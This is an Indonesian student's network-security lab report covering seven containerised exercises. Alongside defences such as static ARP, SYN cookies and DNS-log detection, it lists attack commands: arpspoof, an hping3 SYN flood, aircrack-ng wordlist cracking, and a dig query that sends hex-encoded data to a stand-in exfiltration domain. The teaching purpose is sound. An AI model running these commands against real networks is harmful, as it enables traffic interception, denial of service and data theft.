# LAPORAN HASIL PRAKTIKUM UTS NETWORK SECURITY

**Kasus 7 (K7) — Dokumentasi Praktikum Tugas 1–7**
- **Nama:** Diki Wahyu Permana
- **NIM:** 24552011089
- **Kelas:** TIF RP 24 E CNS
- **Program Studi:** Teknik Informatika
- **Mata Kuliah:** Network Security

---

## TUGAS 1 — MANAJEMEN CONTAINER, DOCKER VOLUME, & COMPOSE
1. **Tujuan:** Memahami penyimpanan data persisten pada Docker Volume dan komunikasi antar-container menggunakan Docker Compose.
2. **Perintah:**
   - `docker volume create vol-k7`
   - `docker run --name w-k7 -v vol-k7:/data alpine sh -c 'echo 24552011089 > /data/laporan-k7.txt'`
   - `docker rm w-k7`
   - `docker run --rm -v vol-k7:/data alpine cat /data/laporan-k7.txt`
   - `docker compose -p k7 -f b/b1-compose/docker-compose.yml up -d`
   - `docker compose -p k7 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target`
   - `docker compose -p k7 -f b/b1-compose/docker-compose.yml down -v`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 1/`.
4. **Kesimpulan:** Data NIM `24552011089` tetap tersimpan di volume `vol-k7` meskipun container `w-k7` dihapus, dan container `attacker` berhasil terhubung ke `target`.

---

## TUGAS 2 — KRIPTOGRAFI SIMETRIS, HASHING, & SERTIFIKAT X.509
1. **Tujuan:** Melakukan enkripsi/dekripsi AES-256-CBC, verifikasi integritas SHA-256, dan pembuatan sertifikat X.509 (`CN=k7.uts.local`).
2. **Perintah:**
   - `docker run --rm -e K7_PASSWORD="$K7_PASSWORD" -v "$PWD":/work uts-openssl sh -c 'echo isi laporan k7 > laporan-k7.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k7.txt -out laporan-k7.enc -pass env:K7_PASSWORD && sha256sum laporan-k7.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k7.enc -out hasil-k7.txt -pass env:K7_PASSWORD && sha256sum hasil-k7.txt'`
   - `docker run --rm -v "$PWD":/work uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k7.pem -out cert-k7.pem -days 30 -subj /CN=k7.uts.local && openssl x509 -in cert-k7.pem -noout -subject -issuer -dates'`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 2/`.
4. **Kesimpulan:** Nilai hash SHA-256 file asli dan hasil dekripsi identik, serta sertifikat self-signed RSA 2048-bit berhasil dibuat.

---

## TUGAS 3 — SIMULASI ARP SPOOFING & MITIGASI STATIC ARP
1. **Tujuan:** Memahami cara kerja ARP, simulasi ARP spoofing pada jaringan `lab-arp-k7`, dan mitigasi menggunakan Static ARP.
2. **Perintah:**
   - `docker network create lab-arp-k7`
   - `docker run -d --name korban-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools`
   - `docker run -d --name gateway-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools`
   - `docker run -d --name penyerang-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools`
   - `docker exec -d penyerang-k7 timeout 20 arpspoof -i eth0 -t <IP_KORBAN> <IP_GATEWAY>`
   - `docker exec korban-k7 arp -s <IP_GATEWAY> ca:33:89:6a:93:83`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 3/`.
4. **Kesimpulan:** Penerapan Static ARP (`PERM`) mengunci pemetaan IP gateway ke MAC asli `ca:33:89:6a:93:83` sehingga mencegah manipulasi tabel ARP.

---

## TUGAS 4 — ANALISIS HANDSHAKE WPA2 DENGAN AIRCRACK-NG
1. **Tujuan:** Menganalisis file capture Four-Way Handshake WPA2 menggunakan Aircrack-ng dan wordlist.
2. **Perintah:**
   - `docker run --rm -v "$PWD":/work uts-kali-tools aircrack-ng -w wordlist-k7.txt handshake-k7.cap`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 4/`.
4. **Kesimpulan:** Four-Way Handshake WPA2 berhasil diverifikasi dan diuji kecocokan kuncinya secara offline menggunakan Aircrack-ng (`KEY FOUND!`).

---

## TUGAS 5 — PEMBUATAN PAKET ICMP DENGAN SCAPY & ANALISIS SMURF ATTACK
1. **Tujuan:** Mengirim paket ICMP Echo Request menggunakan Scapy dan memahami mitigasi Smurf Attack.
2. **Perintah:**
   - `docker run --rm -it --network lab-net --cap-add=NET_RAW -v "$PWD/kasus/k7-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py <IP_TUJUAN>`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 5/`.
4. **Kesimpulan:** Target merespons dengan ICMP Type 0 (Echo Reply). Smurf Attack dicegah dengan menonaktifkan IP directed broadcast dan menerapkan ingress filtering.

---

## TUGAS 6 — SIMULASI TCP SYN FLOOD & ANALISIS THREE-WAY HANDSHAKE
1. **Tujuan:** Memahami TCP Three-Way Handshake dan memantau koneksi setengah terbuka (`SYN_RECV`) saat simulasi SYN Flood.
2. **Perintah:**
   - `docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml up -d`
   - `docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV`
   - `docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target`
   - `docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml down -v`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 6/`.
4. **Kesimpulan:** SYN Flood membanjiri antrean `SYN_RECV` pada proses Three-Way Handshake dan dapat dimitigasi dengan mengaktifkan SYN Cookies.

---

## TUGAS 7 — SIMULASI & DETEKSI DNS EXFILTRATION
1. **Tujuan:** Memahami teknik penyisipan data melalui query DNS (DNS Exfiltration) dan deteksinya melalui analisis log.
2. **Perintah:**
   - `docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml up -d`
   - `echo -n 24552011089 | xxd -p`
   - `docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131303839.k7.exfil.lab @dns`
   - `docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k7.log`
   - `python3 kasus/k7-dns-detect/analisis_dns.py dns-k7.log`
   - `echo 3234353532303131303839 | xxd -r -p`
   - `docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml down -v`
3. **Bukti Praktikum:** Terlampir di folder `bukti/Tugas 7/`.
4. **Kesimpulan:** NIM `24552011089` berhasil dikodekan ke hex (`3234353532303131303839`), dikirim via query DNS ke `k7.exfil.lab`, dideteksi oleh skrip analisis log, dan didekodekan kembali secara utuh.
